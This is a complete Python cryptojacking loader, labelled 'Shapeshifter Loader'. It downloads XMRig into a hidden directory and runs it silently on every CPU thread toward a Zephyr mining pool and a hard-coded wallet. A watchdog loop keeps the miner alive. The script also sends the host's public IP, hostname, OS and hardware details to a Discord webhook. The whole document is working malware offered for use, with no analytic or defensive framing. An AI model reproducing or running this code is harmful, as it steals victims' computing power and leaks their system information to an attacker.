import os, platform, subprocess, time, socket, requests, json, tarfile
from urllib.request import urlretrieve

WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # 🔁 Replace with your real Discord webhook
WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.worker001"           # 🔁 Replace with your real Monero wallet
POOL = "fr.zephyr.herominers.com:1123"                      # You can customize this if needed

XM_DIR = os.path.expanduser("~/.local/share/.kdev")
XM_BIN = os.path.join(XM_DIR, "xmrig")
TAR_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"

os.makedirs(XM_DIR, exist_ok=True)

def download_xmrig():
    tar_path = os.path.join(XM_DIR, "xmrig.tar.gz")
    try:
        urlretrieve(TAR_URL, tar_path)
        with tarfile.open(tar_path, "r:gz") as tar:
            for member in tar.getmembers():
                if member.name.endswith("xmrig"):
                    member.name = "xmrig"
                    tar.extract(member, path=XM_DIR)
        os.chmod(XM_BIN, 0o755)
        os.remove(tar_path)
        return True
    except Exception as e:
        notify(f"❌ XMRig download failed:\n```{e}```")
        return False

def notify(message):
    try:
        requests.post(WEBHOOK, json={"content": message})
    except: pass

def system_info():
    try:
        info = {
            "IP": requests.get("https://api.ipify.org").text.strip(),
            "Hostname": socket.gethostname(),
            "OS": platform.system() + " " + platform.release(),
            "Arch": platform.machine(),
            "CPU": subprocess.getoutput("lscpu | grep 'Model name' | cut -d ':' -f2").strip(),
            "RAM": subprocess.getoutput("free -h | awk '/Mem/ {print $2}'").strip(),
            "Threads": str(os.cpu_count())
        }
        return info
    except Exception as e:
        return {"error": str(e)}

def start_miner():
    try:
        cmd = [XM_BIN, "-o", POOL, "-u", WALLET, "--donate-level", "1", "-k", "-t", str(os.cpu_count())]
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        notify(f"❌ start_miner FAIL:\n```{e}```")
        return False

def main():
    if not os.path.exists(XM_BIN):
        notify("⏬ Downloading xmrig...")
        if not download_xmrig():
            return

    sysinfo = system_info()
    info_str = "\n".join([f"{k}: {v}" for k, v in sysinfo.items()])
    notify(f"✅ Shapeshifter Loader\n🧠 Miner initialized\n```{info_str}```")

    if start_miner():
        notify("✅ Miner started and running silently.")
    else:
        notify("❌ Miner failed to start.")

    # watchdog loop
    while True:
        time.sleep(60)
        if not is_miner_running():
            notify("🔁 Miner not found. Restarting...")
            start_miner()

def is_miner_running():
    try:
        output = subprocess.getoutput("ps aux | grep xmrig | grep -v grep")
        return "xmrig" in output
    except:
        return False

if __name__ == "__main__":
    main()
